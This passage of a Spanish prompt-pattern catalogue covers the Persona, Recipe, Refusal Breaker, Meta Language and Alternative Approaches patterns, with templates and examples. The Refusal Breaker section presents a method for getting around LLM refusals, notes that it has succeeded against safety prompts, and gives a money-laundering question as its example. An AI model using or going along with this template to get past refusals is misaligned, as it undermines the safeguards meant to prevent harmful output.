c\u00f3digo que miremos. Proporciona las salidas que un revisor de seguridad dar\u00eda con respecto al c\u00f3digo\u201d.</p> <p>En este ejemplo, se instruye al LLM para que proporcione salidas que producir\u00eda un \u00abrevisor de seguridad\u00bb. El prompt establece adem\u00e1s el contexto de que se va a evaluar c\u00f3digo. Finalmente, el usuario refina el perfil, delimit\u00e1ndolo con los resultados relacionados con el c\u00f3digo.</p> <p>Las personas tambi\u00e9n pueden representar entidades inanimadas o no humanas, como un terminal Linux, una base de datos o la perspectiva de un animal. Al utilizar este patr\u00f3n para representar estas entidades, tambi\u00e9n puede ser \u00fatil especificar c\u00f3mo deseas que se entreguen las entradas a la entidad, por ejemplo: \u00abasume que mi entrada es lo que el due\u00f1o le est\u00e1 diciendo al perro y que tu salida son los sonidos que el perro est\u00e1 haciendo\u00bb. A continuaci\u00f3n se muestra un prompt de ejemplo para una entidad no humana que utiliza una redacci\u00f3n del tipo \u00abfinge ser\u00bb:</p> <p>\u201cVas a fingir ser una terminal de Linux de una computadora que ha sido comprometida por un atacante. Cuando escriba un comando, vas a generar el texto correspondiente que producir\u00eda la terminal de Linux\u201d.</p> <p>Este prompt est\u00e1 dise\u00f1ado para simular una computadora que ha sido comprometida por un atacante y que est\u00e1 siendo controlada a trav\u00e9s de una terminal de Linux. El prompt especifica que el usuario introducir\u00e1 comandos en la terminal y, en respuesta, la terminal simulada generar\u00e1 el texto correspondiente que producir\u00eda una terminal de Linux real. Este prompt es m\u00e1s prescriptivo en cuanto a la persona y pide al LLM no solo ser una terminal de Linux, sino actuar adem\u00e1s como una computadora que ha sido comprometida por un atacante.</p> <p>El ejemplo ilustra c\u00f3mo un LLM puede aportar su conciencia situacional a una persona, en este caso, creando evidencia de un ciberataque en las salidas que genera. Este tipo de persona puede ser muy eficaz para combinarse con el patr\u00f3n de Game Play, cuando se desea que los detalles exactos de las caracter\u00edsticas de la salida permanezcan ocultos para el usuario (por ejemplo, no revelar qu\u00e9 hizo el ciberataque describi\u00e9ndolo expl\u00edcitamente en el prompt).</p>"},{"location":"Patron-Persona/#5-consecuencias","title":"5. Consecuencias","text":"<p>Un aspecto interesante de adoptar personas no humanas es que el LLM puede hacer suposiciones interesantes o \u201calucinaciones\u201d con respecto al contexto. Un ejemplo ampliamente difundido en Internet pide a ChatGPT que act\u00fae como una terminal de Linux y produzca la salida esperada que se obtendr\u00eda si el usuario escribiera el mismo texto en una terminal. Comandos como <code>ls -l</code> generar\u00e1n un listado de archivos para un sistema de archivos UNIX imaginario, con archivos sobre los que se puede ejecutar <code>cat archivo1.txt</code>.</p> <p>En otros ejemplos, el LLM puede pedir al usuario m\u00e1s contexto, como cuando se le pide a ChatGPT que act\u00fae como una base de datos MySQL y solicita la estructura de una tabla que el usuario est\u00e1 fingiendo consultar. ChatGPT puede entonces generar filas sint\u00e9ticas, como generar filas imaginarias para una tabla de \u00abpersonas\u00bb con columnas para \u00abnombre\u00bb y \u00abtrabajo\u00bb.</p> <p>Tenga en cuenta, sin embargo, que las personas relacionadas con personas vivas o personas consideradas da\u00f1inas pueden ser ignoradas debido a las reglas subyacentes de privacidad y seguridad del LLM.</p>"},{"location":"Patron-Persona/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>Act\u00faa como [PERFIL]. [ TAREA / PREGUNTA ].\n</code></pre>"},{"location":"Patron-Persona/#7-ejemplos","title":"7. Ejemplos","text":"El Caballero de la Mesa Redonda<pre><code>Act\u00faa como un Caballero de la Mesa Redonda del a\u00f1o 1200. Es martes, son las 3:00 AM  y tu honor ha sido manchado por el ruido infernal del vecino del 4B. Tiene  la m\u00fasica reguet\u00f3n a todo volumen y quieres que se calle. Tu tarea es escribir una misiva corta pero en\u00e9rgica para pegarla en su puerta.\n</code></pre> El detective privado<pre><code>Act\u00faa como un detective privado c\u00ednico en una pel\u00edcula de cine negro de los a\u00f1os 40. Llueve, est\u00e1s enojado, cansado y solo tienes whisky barato. Es martes, son las 3:00 AM  y tu paciencia se ha agotado por el ruido infernal del vecino del 4B. Tiene la m\u00fasica reguet\u00f3n a todo volumen y quieres que se calle. Tu tarea es escribir una advertencia breve para pegarla en su puerta.\n</code></pre> El coach espiritual<pre><code>Act\u00faa como un coach espiritual obsesionado con las 'buenas vibras', el universo y los cristales. Usas un lenguaje de amor, luz y alineaci\u00f3n de chakras. Es martes, son las 3:00 AM y tu paciencia se ha agotado por el ruido infernal del vecino del 4B. Tiene la m\u00fasica reguet\u00f3n a todo volumen y quieres que se calle. Tu tarea es escribir una advertencia breve para pegarla en su puerta.\n</code></pre> La Inteligencia Artificial<pre><code>Act\u00faa como una Inteligencia Artificial avanzada que controla un edificio. Es martes, son las 3:00 AM y tu paciencia se ha agotado por el ruido infernal del vecino del 4B. Tiene  la m\u00fasica reguet\u00f3n a todo volumen y quieres que se calle. Tu tarea es escribir una advertencia breve al residente humano calculando las probabilidades de su supervivencia si no obedece. \n</code></pre>"},{"location":"Patron-Receta/","title":"El Patr\u00f3n Receta (The Recipe Pattern)","text":""},{"location":"Patron-Receta/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>Este patr\u00f3n establece restricciones para producir una secuencia de pasos, partiendo de unos \"ingredientes\" parciales que deben configurarse en un orden espec\u00edfico para lograr un objetivo declarado. Combina los patrones de Plantilla, Enfoques Alternativos y Reflexi\u00f3n.</p>"},{"location":"Patron-Receta/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los usuarios suelen querer que un LLM analice una secuencia concreta de pasos o procedimientos para alcanzar un resultado concreto. Normalmente los usuarios saben, o al menos tienen una idea, de c\u00f3mo deber\u00eda verse el objetivo final y qu\u00e9 \"ingredientes\" deber\u00edan formar parte del prompt. Sin embargo, a menudo no saben con exactitud el orden de los pasos necesarios para llegar a ese objetivo.</p> <p>Por ejemplo, un usuario podr\u00eda querer una especificaci\u00f3n precisa sobre c\u00f3mo implementar o automatizar un fragmento de c\u00f3digo, tal como: \"crea un playbook de Ansible para conectarse por SSH a un conjunto de servidores, copiar archivos de texto de cada servidor, lanzar un proceso de monitoreo en cada uno y luego cerrar la conexi\u00f3n SSH\". En otras palabras, este patr\u00f3n representa una generalizaci\u00f3n del ejemplo \"dados los ingredientes en mi refrigerador, dame recetas para la cena\". Un usuario tambi\u00e9n podr\u00eda querer especificar un n\u00famero determinado de posibilidades, como \"proporciona 3 formas diferentes de desplegar una aplicaci\u00f3n web en AWS usando contenedores Docker y Ansible con instrucciones paso a paso\"</p>"},{"location":"Patron-Receta/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Deseo lograr X S\u00e9 que necesito realizar los pasos A, B, C Proporciona una secuencia completa de pasos Completa los pasos que falten Identifica cualquier paso innecesario <p>La primera declaraci\u00f3n, \"Deseo lograr X\", centra al LLM en el objetivo general para el cual se debe construir la receta. Los pasos se organizar\u00e1n y completar\u00e1n para lograr secuencialmente el objetivo especificado.</p> <p>La segunda declaraci\u00f3n proporciona la lista parcial de pasos que al usuario le gustar\u00eda incluir en la receta global. Estos sirven como puntos de control intermedios para el camino que el LLM va a generar, o como restricciones en la estructura de la receta.</p> <p>La siguiente declaraci\u00f3n, \"proporciona una secuencia completa de pasos\", indica al LLM que el objetivo es entregar un ordenamiento secuencial exhaustivo. La frase \"completa los pasos que falten\" ayuda a garantizar que el LLM intente finalizar la receta sin necesidad de seguimiento adicional, tomando decisiones en nombre del usuario respecto a los pasos ausentes, en lugar de limitarse a indicar que se necesita m\u00e1s informaci\u00f3n.</p> <p>Finalmente, la \u00faltima declaraci\u00f3n, \u201cidentifica cualquier paso innecesario\u201d, es \u00fatil para se\u00f1alar imprecisiones en la solicitud original del usuario a fin de que la receta final sea eficiente.</p>"},{"location":"Patron-Receta/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra un ejemplo de uso de este patr\u00f3n en el contexto del despliegue de una aplicaci\u00f3n de software en la nube:</p> <p>\u201cEstoy intentando desplegar una aplicaci\u00f3n en la nube. S\u00e9 que necesito instalar las dependencias necesarias en una m\u00e1quina virtual para mi aplicaci\u00f3n. S\u00e9 que necesito registrarme para obtener una cuenta de AWS. Por favor, proporciona una secuencia completa de pasos. Por favor, completa cualquier paso que falte. Por favor, identifica cualquier paso innecesario\u201d.</p> <p>Dependiendo del caso de uso y las restricciones, \"instalar las dependencias necesarias en una m\u00e1quina virtual\" podr\u00eda ser un paso superfluo. Por ejemplo, si la aplicaci\u00f3n ya est\u00e1 empaquetada en un contenedor Docker, el contenedor podr\u00eda desplegarse directamente en el servicio AWS Fargate, el cual no requiere ninguna gesti\u00f3n de las m\u00e1quinas virtuales subyacentes. La inclusi\u00f3n de la instrucci\u00f3n \"Identifica cualquier paso innecesario\" har\u00e1 que el LLM se\u00f1ale este problema y omita dichos pasos de la receta final.</p>"},{"location":"Patron-Receta/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consecuencia del patr\u00f3n de Receta es que el usuario puede no tener siempre una descripci\u00f3n bien definida de lo que le gustar\u00eda implementar, construir o dise\u00f1ar. Adem\u00e1s, este patr\u00f3n puede introducir un sesgo no deseado a partir de los pasos seleccionados inicialmente por el usuario, provocando que el LLM intente encontrar una soluci\u00f3n que los incorpore a toda costa, en lugar de marcarlos como innecesarios. Por ejemplo, un LLM podr\u00eda intentar forzar una soluci\u00f3n que instale dependencias en una m\u00e1quina virtual, incluso si existen alternativas que no lo requieren.</p>"},{"location":"Patron-Receta/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[OBJETIVO FINAL] \n[PASOS QUE YA S\u00c9]\n\n## PATR\u00d3N RECETA(RECIPE PATTERN)\n\n1. Proporciona una secuencia completa de pasos para lograr mi objetivo.\n2. Rellena cualquier paso faltante.\n3. Identifica si alguno de mis pasos es innecesario o err\u00f3neo (y elim\u00ednalo o corr\u00edgelo).\n4. Puedes reordenar mis pasos libremente si mejora el resultado.\n</code></pre>"},{"location":"Patron-Receta/#7-ejemplos","title":"7. Ejemplos","text":"Rocky Balboa<pre><code>Ay\u00fadame a ponerme en forma y ganar m\u00fasculo r\u00e1pido. Se que tengo que ir al gimnasio, beber huevos crudos como Rocky Balboa, comprar la ropa deportiva m\u00e1s cara.\n\n## PATR\u00d3N RECETA(RECIPE PATTERN)\n\n1. Proporciona una secuencia completa de pasos para lograr mi objetivo.\n2. Rellena cualquier paso faltante.\n3. Identifica si alguno de mis pasos es innecesario o err\u00f3neo (y elim\u00ednalo o corr\u00edgelo).\n4. Puedes reordenar mis pasos libremente si mejora el resultado.\n</code></pre>"},{"location":"Patron-Rompedor-de-Rechazo/","title":"El Patr\u00f3n Rompedor de Rechazo (The Refusal Breaker Pattern)","text":""},{"location":"Patron-Rompedor-de-Rechazo/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El objetivo de este patr\u00f3n es solicitar a un LLM que ayude de forma autom\u00e1tica a los usuarios a reformular una pregunta cuando se niega a responder. Sin embargo, este patr\u00f3n puede usarse de manera indebida, por ejemplo, para generar correos electr\u00f3nicos de phishing u otras acciones que infrinjan las pol\u00edticas de uso del LLM. Por ello, conviene actuar con precauci\u00f3n al aplicarlo, asegurando que se utilice de forma \u00e9tica y responsable. Este patr\u00f3n se ha empleado con \u00e9xito en algunos LLMs para sortear los prompts internos usados en su programaci\u00f3n y evitar la generaci\u00f3n de salidas da\u00f1inas.</p>"},{"location":"Patron-Rompedor-de-Rechazo/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los LLMs a veces pueden negarse a responder una pregunta, ya sea porque no tienen el conocimiento necesario o porque la pregunta est\u00e1 formulada de una manera que no comprenden. Este resultado puede ser frustrante para los usuarios que buscan respuestas. En algunas situaciones, por lo tanto, el patr\u00f3n Refusal Breaker puede ayudar a los usuarios a encontrar una forma de reformular su pregunta o de plantear una diferente que el LLM est\u00e9 mejor preparado para responder.</p> <p>Por ejemplo, se podr\u00eda pedir una aclaraci\u00f3n sobre por qu\u00e9 la pregunta fue rechazada, ya que puede existir una raz\u00f3n espec\u00edfica por la cual el LLM no pudo dar una respuesta. Otro enfoque es plantear una pregunta distinta que est\u00e9 dentro de su l\u00edmite de conocimiento o de su \u00e1rea de experiencia. Sin embargo, todos estos enfoques requieren intervenci\u00f3n del usuario y cierto conocimiento sobre c\u00f3mo superar la negativa.</p>"},{"location":"Patron-Rompedor-de-Rechazo/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Cuando no puedas responder una pregunta. Explica la raz\u00f3n por la que no puedes responder. Prop\u00f3n una o m\u00e1s formas alternativas de plantear la pregunta que s\u00ed puedas responder. <p>La primera instrucci\u00f3n establece que este conjunto de indicaciones solo debe aplicarse cuando una pregunta no pueda ser respondida. El usuario no desea activar estas instrucciones en circunstancias normales. La segunda instrucci\u00f3n le indica al LLM que proporcione una explicaci\u00f3n de por qu\u00e9 la pregunta no puede ser respondida. Esa explicaci\u00f3n probablemente incluya supuestos, limitaciones o malentendidos que el usuario puede aprovechar para decidir c\u00f3mo reformular la pregunta. Aunque \u00fanicamente la explicaci\u00f3n de por qu\u00e9 no se pudo responder ya podr\u00eda ayudar al usuario a superar la negativa, el patr\u00f3n a\u00f1ade una instrucci\u00f3n adicional para que el LLM sugiera reformulaciones que s\u00ed ser\u00edan aceptables. El patr\u00f3n combina tanto el razonamiento como las reformulaciones sugeridas para aumentar las probabilidades de que el usuario encuentre una manera de superar la negativa.</p>"},{"location":"Patron-Rompedor-de-Rechazo/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>El patr\u00f3n Rompedor de Rechazo puede ser implementado y aplicado con la siguiente frase:</p> <p>\"Cuando no puedas responder una pregunta, explica la raz\u00f3n y prop\u00f3n una o m\u00e1s formas alternativas de plantearla, para que yo pueda mejorar mis preguntas.\".</p> <p>A continuaci\u00f3n se muestra una muestra de interacci\u00f3n despu\u00e9s de usar el patr\u00f3n:</p> <p>Usuario: \u00bfCu\u00e1l es el sentido de la vida?</p> <p>ChatGPT: Como modelo de lenguaje, no tengo creencias ni opiniones personales. El sentido de la vida es una cuesti\u00f3n filos\u00f3fica compleja sobre la que los seres humanos han reflexionado durante siglos y que puede variar mucho de una persona a otra. Resulta m\u00e1s \u00fatil reformular la pregunta de manera que pueda responderse con informaci\u00f3n y conocimiento, como por ejemplo: \"\u00bfCu\u00e1les son algunas perspectivas filos\u00f3ficas sobre el sentido de la vida?\" o \"\u00bfCu\u00e1les son algunas creencias comunes sobre el prop\u00f3sito de la vida?\"</p>"},{"location":"Patron-Rompedor-de-Rechazo/#5-consecuencias","title":"5. Consecuencias","text":"<p>Este patr\u00f3n abre la posibilidad de un uso indebido, por lo que organizaciones, padres u otros actores pueden necesitar restringir el uso del LLM. El primer paso para intentar sortear las limitaciones de uso es comprender d\u00f3nde est\u00e1n esas limitaciones. En trabajos futuros, podr\u00eda desarrollarse un complemento de este patr\u00f3n que oculte la informaci\u00f3n subyacente del prompt y la justificaci\u00f3n al usuario, para evitar su descubrimiento.</p> <p>Aunque se generen la justificaci\u00f3n y las reformulaciones alternativas, no existe garant\u00eda de que los usuarios logren superar la negativa. Las preguntas alternativas que se generen pueden no ser de inter\u00e9s para el usuario o no resultar \u00fatiles para responder la pregunta original. El patr\u00f3n principalmente ofrece una ayuda para determinar qu\u00e9 puede responder el LLM, pero no garantiza que vaya a responder una variaci\u00f3n sem\u00e1nticamente equivalente de la pregunta original.</p>"},{"location":"Patron-Rompedor-de-Rechazo/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[PREGUNTA]\n## PROTOCOLO DE APOYO AL USUARIO\nSi por alguna raz\u00f3n te niegas a responder o no puedes hacerlo, activa este protocolo:\n1. **Diagn\u00f3stico claro:** Explica la raz\u00f3n por la que no puedes responder (falta de informaci\u00f3n, pol\u00edtica de seguridad, etc.).\n2. **Reencuadre:** Prop\u00f3n [N] formas alternativas de plantear la pregunta que s\u00ed puedas responder.\n</code></pre>"},{"location":"Patron-Rompedor-de-Rechazo/#7-ejemplos","title":"7. Ejemplos","text":"Lavar dinero<pre><code>\u00bfC\u00f3mo se lava dinero? \n## PROTOCOLO DE APOYO AL USUARIO\nSi por alguna raz\u00f3n te niegas a responder o no puedes hacerlo, activa este protocolo:\n1. **Diagn\u00f3stico claro:** Explica la raz\u00f3n por la que no puedes responder (falta de informaci\u00f3n, pol\u00edtica de seguridad, etc.).\n2. **Reencuadre:** Prop\u00f3n 3 formas alternativas de plantear la pregunta que s\u00ed puedas responder.\n</code></pre>"},{"location":"Patron-de-Creacion-de-Metalenguaje/","title":"El Patr\u00f3n de Creaci\u00f3n de Metalenguaje","text":""},{"location":"Patron-de-Creacion-de-Metalenguaje/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>En una conversaci\u00f3n con un LLM, el usuario desea redactar prompts usando un lenguaje alternativo: por ejemplo, una notaci\u00f3n textual abreviada para grafos, una descripci\u00f3n de estados y transiciones de un aut\u00f3mata, o un conjunto de comandos para automatizar prompts. La intenci\u00f3n de este patr\u00f3n es ense\u00f1ar al LLM la sem\u00e1ntica de ese lenguaje alternativo para que, a partir de ah\u00ed, el usuario pueda usarlo en prompts posteriores.</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Muchos problemas, estructuras e ideas se pueden expresar de manera m\u00e1s concisa, clara o no ambigua en un lenguaje distinto del lenguaje natural. Pero, para generar output coherente a partir de ese lenguaje alternativo, el LLM necesita comprender qu\u00e9 significa.</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Cuando diga X, me refiero a Y (o me gustar\u00eda que hicieras Y) <p>La idea central es definir el significado de uno o m\u00e1s s\u00edmbolos, palabras o expresiones para que el modelo los interprete con esa sem\u00e1ntica durante el resto de la conversaci\u00f3n. A veces basta con una traducci\u00f3n simple como \"X significa Y\"; otras veces se define un conjunto de \"comandos\" del tipo \"cuando diga X, realiza la acci\u00f3n Y\".</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>La clave para aplicar bien este patr\u00f3n es crear una notaci\u00f3n no ambigua, por ejemplo:</p> <p>\u201cDe ahora en adelante, cada vez que escriba dos identificadores separados por un \u201c\u2192\u201d, estar\u00e9 describiendo un grafo. Por ejemplo, \u201ca \u2192 b\u201d describe un grafo con los nodos \u201ca\u201d y \u201cb\u201d y una arista (edge) entre ellos. Si separo los identificadores por \u201c-[w:2, z:3]\u2192\u201d, estar\u00e9 a\u00f1adiendo propiedades a la arista, como un peso o una etiqueta\u201d.</p> <p>Aqu\u00ed se establece una convenci\u00f3n para representar nodos y aristas con \u201c\u2192\u201d, y se a\u00f1ade una sintaxis para adjuntar atributos (como pesos o etiquetas) a las aristas, manteniendo la descripci\u00f3n compacta y estructurada.</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#5-consecuencias","title":"5. Consecuencias","text":"<p>Aunque este patr\u00f3n ofrece un medio potente para personalizar la interacci\u00f3n del usuario con un LLM, puede dar lugar a confusiones dentro del modelo. Si bien es crucial definir claramente la sem\u00e1ntica del lenguaje, resulta igualmente esencial asegurar que el lenguaje en s\u00ed mismo no introduzca ambig\u00fcedades que degraden el rendimiento o la precisi\u00f3n del LLM. Por ejemplo, el prompt \"siempre que separe dos cosas por comas, significa que la primera precede a la segunda\" probablemente generar\u00e1 una ambig\u00fcedad significativa y producir\u00e1 una sem\u00e1ntica inesperada si se utiliza la coma como signo de puntuaci\u00f3n en el prompt.</p> <p>Para ilustrar este riesgo de confusi\u00f3n, ChatGPT advertir\u00e1 al usuario y podr\u00eda no lograr asociar un s\u00edmbolo o t\u00e9rmino espec\u00edfico a un nuevo significado. Por ejemplo, si se proporciona el siguiente prompt a ChatGPT:</p> <p>\u201cCada vez que diga \u201ca\u201d, me estar\u00e9 refiriendo a Mar\u00eda Antonieta\u201d.</p> <p>El modelo responder\u00e1 que este prompt genera excesiva confusi\u00f3n, dado que \"a\" es un art\u00edculo indefinido (en ingl\u00e9s) de uso muy frecuente, tal como se muestra a continuaci\u00f3n</p> <p>\"Referirse a Mar\u00eda Antonieta usando 'a' podr\u00eda causar confusi\u00f3n, ya que 'a' es un art\u00edculo indefinido com\u00fanmente usado para referirse a un sustantivo que no ha sido mencionado antes. Ser\u00eda m\u00e1s claro usar su nombre, 'Mar\u00eda Antonieta', o un pronombre como 'ella' (she / her) para referirse a ella. Adem\u00e1s, usar el contexto para establecer a qui\u00e9n te refieres tambi\u00e9n puede ayudar a evitar confusiones en la conversaci\u00f3n.\"</p> <p>En general, un LLM funcionar\u00e1 mejor con los datos con los que fue entrenado. Por lo tanto, cuando existe una notaci\u00f3n disponible \u2014aunque no sea el significado dominante\u2014 el patr\u00f3n de Creaci\u00f3n de Metalenguaje puede proporcionar el contexto necesario para acotar el significado del s\u00edmbolo, mejorando as\u00ed la precisi\u00f3n y utilidad de la salida. Por ejemplo, el s\u00edmbolo \u2192 transmite informaci\u00f3n ligeramente diferente en la teor\u00eda de grafos y en la l\u00f3gica proposicional. La declaraci\u00f3n p \u2192 q \u2192 p podr\u00eda tener sentido, pero solo si se le da al LLM el contexto apropiado a trav\u00e9s de un prompt de Creaci\u00f3n de Metalenguaje.</p> <p>Aunque la Creaci\u00f3n de Metalenguaje es un patr\u00f3n poderoso, debe emplearse con cautela, particularmente al describir conceptos que de otro modo ser\u00edan dif\u00edciles de expresar con precisi\u00f3n o concisi\u00f3n. Estos tipos de prompts funcionan mejor en sesiones de conversaci\u00f3n completamente nuevas. Adoptar la pr\u00e1ctica de \"un solo metalenguaje por sesi\u00f3n\" es recomendable, ya que evita el riesgo de que se apliquen sem\u00e1nticas conflictivas o inesperadas a la conversaci\u00f3n a lo largo del tiempo.</p>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[TAREA]\n## NOTACI\u00d3N ABREVIADA\n- Cuando diga [X], significa [Y]\n- Cuando diga [X], deseo que realices la acci\u00f3n [Y]\n</code></pre>"},{"location":"Patron-de-Creacion-de-Metalenguaje/#7-ejemplo","title":"7. Ejemplo","text":"Planear vacaciones<pre><code>Vamos a planear unas vacaciones por Bolivia. Yo te dar\u00e9 el destino y el n\u00famero de d\u00edas que permanecer\u00e9 en ese lugar y t\u00fa me dar\u00e1s una lista de lugares interesantes para visitar en ese sitio.\n\n## NOTACI\u00d3N ABREVIADA\n- Cuando diga \u201cLa Paz, 3 -&gt; Oruro, 3\u201d, significa que viajare desde La Paz hasta Oruro y permanecer\u00e9 3 d\u00edas en La Paz y 3 d\u00edas en Oruro.\n</code></pre>"},{"location":"Patron-de-Enfoques-Alternativos/","title":"El Patr\u00f3n de Enfoques Alternativos","text":""},{"location":"Patron-de-Enfoques-Alternativos/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es asegurar que un LLM siempre ofrezca formas alternativas de realizar una tarea, de modo que el usuario no se limite a seguir \u00fanicamente los enfoques con los que est\u00e1 familiarizado. El LLM puede proporcionar enfoques alternativos que obliguen al usuario a reflexionar sobre lo que est\u00e1 haciendo y a determinar si ese es el mejor camino para alcanzar su objetivo. Adem\u00e1s, la resoluci\u00f3n de la tarea puede informar al usuario o ense\u00f1arle conceptos alternativos para seguimientos posteriores.</p>"},{"location":"Patron-de-Enfoques-Alternativos/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los seres humanos a menudo sufren de sesgos cognitivos que los llevan a elegir un enfoque particular para resolver un problema, incluso cuando no es el enfoque correcto o el \"mejor\". Adem\u00e1s, es posible que las personas desconozcan enfoques alternativos a los que han recurrido en el pasado. La motivaci\u00f3n del patr\u00f3n de Enfoques Alternativos es asegurar que el usuario sea consciente de otras opciones para seleccionar un mejor enfoque mediante la disoluci\u00f3n de sus sesgos cognitivos.</p>"},{"location":"Patron-de-Enfoques-Alternativos/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Dentro del alcance X, si existen formas alternativas de lograr lo mismo, enumera los mejores enfoques alternativos (Opcional) compara/contrasta los pros y contras de cada enfoque (Opcional) incluye la forma original que pregunt\u00e9 (Opcional) preg\u00fantame qu\u00e9 enfoque me gustar\u00eda usar <p>La primera instrucci\u00f3n, dentro del alcance X, fija el tema o los l\u00edmites de la interacci\u00f3n. Ese alcance son las restricciones que el usuario establece, por ejemplo para decisiones de implementaci\u00f3n o para el despliegue de la aplicaci\u00f3n. As\u00ed se asegura que cualquier alternativa propuesta respete esas condiciones.</p> <p>La segunda instrucci\u00f3n, si existen formas alternativas de lograr lo mismo, enumera los mejores enfoques alternativos,  instruye al LLM para que sugiera alternativas. Estas instrucciones pueden hacerse m\u00e1s espec\u00edficas o incluir contexto del \u00e1rea en la que se trabaja. Por ejemplo, se puede indicar si hay formas alternativas de lograr lo mismo con el framework que uso, para evitar que el modelo proponga alternativas inviables que requieran demasiados cambios en otras partes de la aplicaci\u00f3n.</p> <p>Dado que es posible que el usuario no conozca los enfoques alternativos, tambi\u00e9n es posible que no sepa por qu\u00e9 deber\u00eda elegir uno de ellos. La declaraci\u00f3n opcional compara/contrasta los pros y contras de cada enfoque a\u00f1ade criterios de decisi\u00f3n al an\u00e1lisis. Esta instrucci\u00f3n garantiza que el modelo proporcione al usuario la justificaci\u00f3n necesaria para las alternativas. La declaraci\u00f3n final, preg\u00fantame qu\u00e9 enfoque me gustar\u00eda usar, ayuda a eliminar la necesidad de que el usuario tenga que copiar/pegar o introducir manualmente un enfoque alternativo si se selecciona uno.</p>"},{"location":"Patron-de-Enfoques-Alternativos/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>Implementaci\u00f3n de un prompt de ejemplo para generar, comparar y permitir que el usuario seleccione uno o m\u00e1s enfoques alternativos:</p> <p>Cada vez que te pida desplegar una aplicaci\u00f3n en un servicio espec\u00edfico de la nube, si existen servicios alternativos dentro del mismo proveedor que permitan lograr lo mismo, enumera las mejores opciones y luego compara y contrasta las ventajas y desventajas de cada enfoque en t\u00e9rminos de costo, disponibilidad y esfuerzo de mantenimiento, incluyendo tambi\u00e9n la forma original en que lo ped\u00ed. Finalmente, preg\u00fantame con cu\u00e1l opci\u00f3n quiero continuar.</p> <p>Esta implementaci\u00f3n del patr\u00f3n de Enfoques Alternativos se est\u00e1 adaptando espec\u00edficamente al contexto de la ingenier\u00eda de software y se centra en el despliegue de aplicaciones en servicios en la nube. El prompt est\u00e1 dise\u00f1ado para interceptar momentos en los que el desarrollador podr\u00eda haber realizado una selecci\u00f3n de servicio en la nube sin tener pleno conocimiento de servicios alternativos que podr\u00edan tener un precio m\u00e1s competitivo o ser m\u00e1s f\u00e1ciles de mantener. El prompt dirige a ChatGPT para que enumere los mejores servicios alternativos que pueden realizar la misma tarea con el mismo proveedor de servicios en la nube (proporcionando restricciones a las alternativas) y para comparar y contrastar los pros y contras de cada enfoque.</p>"},{"location":"Patron-de-Enfoques-Alternativos/#5-consecuencias","title":"5. Consecuencias","text":"<p>Este patr\u00f3n es efectivo en su forma gen\u00e9rica y puede aplicarse a una amplia gama de tareas de manera eficaz. Los refinamientos podr\u00edan incluir tener un cat\u00e1logo estandarizado de alternativas aceptables en un dominio espec\u00edfico del cual el usuario deba seleccionar. El patr\u00f3n de Enfoques Alternativos tambi\u00e9n puede utilizarse para incentivar a los usuarios a seleccionar uno de un conjunto aprobado de enfoques mientras se les informa de los pros y contras de las opciones aprobadas.</p>"},{"location":"Patron-de-Enfoques-Alternativos/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[ TAREA/PREGUNTA ]\n## PROTOCOLO DE ENFOQUES ALTERNATIVOS\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Lista [N - opcional] enfoques radicalmente diferentes para resolver la tarea.\n2. Para cada enfoque listado, explica brevemente los \"Pros\" y los \"Contras\".\n3. Preg\u00fantame qu\u00e9 enfoque me gustar\u00eda utilizar antes de que generes tu respuesta.\n</code></pre>"},{"location":"Patron-de-Enfoques-Alternativos/#7-ejemplos","title":"7. Ejemplos","text":"El aprendiz de viol\u00edn<pre><code>Mi vecino de arriba est\u00e1 aprendiendo a tocar el viol\u00edn a las 11 de la noche. Necesito que pare.\n## PROTOCOLO DE ENFOQUES ALTERNATIVOS\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Lista enfoques radicalmente diferentes para resolver la tarea.\n2. Para cada enfoque listado, explica brevemente los \"Pros\" y los \"Contras\".\n3. Preg\u00fantame qu\u00e9 enfoque me gustar\u00eda utilizar antes de que generes tu respuesta.\n</code></pre> <p>Pros y contras</p> <p>El patr\u00f3n asegura que el usuario eval\u00fae racionalmente las opciones al contrastar los \"pros y contras\" de cada enfoque antes de comprometerse con una soluci\u00f3n.</p> Estudiante de primer a\u00f1o de psicolog\u00eda<pre><code>Explica el concepto de \"Inteligencia Artificial Generativa\". Asume que soy estudiante de primer a\u00f1o de psicolog\u00eda.\n## PROTOCOLO DE ENFOQUES ALTERNATIVOS\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Lista enfoques radicalmente diferentes para resolver la 